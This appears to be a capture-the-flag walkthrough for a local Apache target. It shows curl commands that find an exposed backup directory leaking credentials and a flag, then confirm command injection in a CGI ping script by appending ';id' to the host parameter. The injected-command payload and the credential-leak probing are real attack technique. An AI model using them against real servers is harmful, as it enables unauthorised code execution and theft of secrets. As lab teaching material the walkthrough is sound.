# Finding the Bug

## Enumerate the web root

Start by requesting the root of the server:

```bash
curl -v http://127.0.0.1:8080/
```

Apache returns a 403 Forbidden. Directory listing is disabled here. That is correct behavior, but it tells you the web root exists. The `Options -Indexes` directive is set for `/var/www/html/`.

## Discover the backup directory

Probe common directory names. Any path not explicitly covered by a restrictive `<Directory>` block inherits a different policy. Try:

```bash
curl -v http://127.0.0.1:8080/backup/
```

The response is a 200 with an HTML directory listing. You can see `config.bak` in the listing. Apache is configured with `Options +Indexes` for this subdirectory. That override was added separately and was never changed.

## Inspect the backup file

```bash
curl http://127.0.0.1:8080/backup/config.bak
```

The response contains a configuration dump: database hostname, credentials, and flag1.

## Find the CGI endpoint

The Apache configuration exposes a CGI directory. Look for scripts:

```bash
curl -v http://127.0.0.1:8080/cgi-bin/status.sh
```

Without a `host` parameter the script uses a default and runs ping against localhost. The response body includes the ping output. The script is functioning.

## Identify the injection point

Look at what the script does with the `host` parameter:

```bash
curl "http://127.0.0.1:8080/cgi-bin/status.sh?host=127.0.0.1"
```

Output:
```
Checking host: 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.047 ms
```

The `host` value appears verbatim in the output. The script passes it to bash with no filtering. Inject a second command by appending a semicolon followed by `id`:

```bash
curl "http://127.0.0.1:8080/cgi-bin/status.sh?host=127.0.0.1%3Bid"
```

`%3B` is the URL encoding for `;`. The response includes the output of `id` after the ping result:

```
Checking host: 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Command injection confirmed. The process runs as `www-data`.
